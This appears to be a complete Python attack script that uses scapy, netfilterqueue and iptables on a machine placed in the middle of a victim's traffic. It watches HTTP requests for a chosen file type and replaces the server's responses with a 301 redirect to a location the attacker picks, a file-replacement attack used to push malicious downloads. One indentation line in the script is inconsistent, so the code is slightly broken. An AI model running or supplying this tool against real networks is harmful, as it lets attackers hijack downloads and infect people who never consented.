import scapy.all 
import os
import netfilterqueue
import argparse


target_list = []


def get_argument():
	"""To get arguments"""
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', help= 'the target file')
	parser.add_argument('-l', '--load', help= 'the load')
	args = parser.parse_args()
	return args.target, args.load

def set_load(scapy_pkt ,load):
	scapy_pkt[scapy.all.Raw].load = load
	del scapy_pkt[scapy.all.IP].len
	del scapy_pkt[scapy.all.IP].chksum
	del scapy_pkt[scapy.all.TCP].chksum
	return scapy_pkt


def processed_pkt(pkt):
	scapy_pkt = scapy.all.IP(pkt.get_payload())
	if scapy_pkt.haslayer(scapy.all.Raw):
		if scapy_pkt[scapy.all.TCP].dport == 80:
			if target in str(scapy_pkt[scapy.all.Raw].load):
				print('[+] pdf Request')
				target_list.append(scapy_pkt[scapy.all.TCP].ack)

		elif scapy_pkt[scapy.all.TCP].sport == 80:
			if scapy_pkt[scapy.all.TCP].seq in target_list:
				print('[++]Replacing a file')
				target_list.remove(scapy_pkt[scapy.all.TCP].seq)
				scapy_pkt = set_load(scapy_pkt,new_load)
    			pkt.set_payload(str(scapy_pkt))	
				
	pkt.accept()		


target ,load = get_argument()
new_load = 'HTTP/1.1 301 Moved Permanently\nLocation: '+load+'\n\n'
try:
	os.system('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0')
	# os.system('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0')
	# os.system('sudo iptables -I INPUT -j NFQUEUE --queue-num 0')
	print('IP table modified')
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, processed_pkt)
	queue.run()
except KeyboardInterrupt:
	print('[+] Flushing IP tables')
	os.system('sudo iptables --flush')
